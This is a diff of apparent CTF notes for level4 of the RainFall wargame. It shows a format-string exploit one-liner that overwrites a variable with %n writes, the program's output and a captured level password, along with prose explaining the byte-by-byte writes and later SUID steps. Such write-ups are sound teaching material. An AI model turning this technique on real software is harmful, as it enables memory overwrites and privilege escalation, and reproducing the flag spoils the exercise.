@@ -1,32 +1,21 @@
-level4@RainFall:/tmp$ python -c "print('\x08\x04\x98\x10'[::-1] + '\x08\x04\x98\x11'[::-1] + '\x08\x04\x98\x12'[::-1] + 56*'A' + '%12\$n' + 17*'A' + '%13\$n' + 173*'A' + '%14\$n')" > banana
-level4@RainFall:/tmp$ cat banana | /home/user/level4/level4
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
-
-
-// Alex version
-python -c "print('\x08\x04\x98\x10'[::-1] + '\x08\x04\x98\x11'[::-1] + '\x08\x04\x98\x12'[::-1] + 56*'A' + '%12\$n' + 17*'A' + '%13\$n' + 173*'A' + '%14\$n')" | ~/level4
-
-
 # ------------------------------------------------------------------------
 # Obtain the next password
 # ------------------------------------------------------------------------
 
-# Similar to level3, we will provide a formatted string for printf to overwrite a variable.
+# Similar to level3, we will input a malicious format specifier string for printf to overwrite a variable.
 
 # This time, we need to overwrite the variable at address 0x08049810 with the value 0x1025544.
 
-# We can split up this large value into 3 small value writes sequentially:
-
+# We can split up this large value into 3 small values to write sequentially:
 	Write the 1-byte value 0x44 ( 68 ) at address 0x08049810
 	Write the 1-byte value 0x55 ( 85 ) at address 0x08049811
 	Write the 2-byte value 0x0102 ( 258 ) at address 0x08049812
 
 # Format the string thus:
-	# Print the 3 addresses.  We have printed 12 bytes thus far.
-	# Print 56 bytes.  We have printed 68 bytes thus far.  Write 68 to %hhn at address 0x08049810.
-	# Print 17 bytes.  We have printed 85 bytes thus far.  Write 85 to %hhn at address 0x08049811.
-	# Print 173 bytes.  We have printed 258 bytes thus far.  Write 258 to %hhn at address 0x08049812.
+	Print the 3 addresses.  We have printed 12 bytes thus far.
+	Print 56 bytes.  We have printed 68 bytes thus far.  Write 68 to %hhn at address 0x08049810.
+	Print 17 bytes.  We have printed 85 bytes thus far.  Write 85 to %hhn at address 0x08049811.
+	Print 173 bytes.  We have printed 258 bytes thus far.  Write 258 to %hn at address 0x08049812.
 
 # We find the first 12 bytes of the buffer are in the 12$, 13$, 14$ args of printf.
 level4@RainFall:/tmp$ ~/level4
@@ -54,7 +43,7 @@ su level5
     # Edit suid
     chmod u+s ft_level4
 
-    # Move the exploit to home directory
+    # Move the program to home directory
     chmod +wx ~; mv ft_level4 ~
 
 # As user level4:
